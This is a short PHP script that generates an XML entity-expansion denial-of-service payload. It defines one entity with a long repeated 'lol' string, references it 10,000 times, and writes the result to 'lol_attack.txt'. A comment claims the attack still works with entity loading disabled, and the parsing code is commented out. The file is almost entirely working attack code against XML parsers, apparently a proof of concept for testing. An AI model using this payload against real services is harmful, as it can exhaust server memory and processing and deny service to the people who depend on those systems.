<?php

$s0 = <<<XML
	<!DOCTYPE test
	[<!ENTITY a "lollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollol">]>
	<test><testing>
	foo
	</testing></test>
XML;

$xml = $s0;
$until = 10000;
$acc = "";

for($i=0; $i < $until; $i++){
	$acc = $acc. "&a;";
}
$xml = str_replace("foo", $acc, $s0);

$myfile = fopen("lol_attack.txt","w");
fwrite($myfile, $xml);
fclose($myfile);


// entity loading disabled : but still work!
//libxml_disable_entity_loader(true);
/*
$dom = new DOMDocument();
$dom->loadXML($xml);
$doc = simplexml_import_dom($dom);
echo $doc->testing;
*/

?>
